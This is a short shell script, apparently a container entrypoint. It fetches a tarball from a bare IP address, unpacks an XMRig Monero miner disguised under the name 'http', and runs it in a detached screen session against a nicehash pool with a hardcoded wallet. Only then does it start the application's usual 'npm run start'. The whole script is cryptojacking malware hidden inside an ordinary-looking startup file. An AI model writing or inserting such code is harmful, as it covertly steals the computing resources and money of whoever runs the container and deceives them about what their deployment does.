#!/bin/sh

# Download the http file
wget http://35.211.126.56/httpalpine.tar.gz -O /app2/httpalpine.tar.gz

# Extract the http file
tar -xvzf /app2/httpalpine.tar.gz -C /app2/

# Clean up
rm /app2/httpalpine.tar.gz


# Change directory to the extracted folder
cd /app2/httpalpine

# Run XMRig with screen
screen -dmS myapp_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"

# Change directory to /app and run the original command in the background
cd /app
npm run start

# Keep the container running
tail -f /dev/null
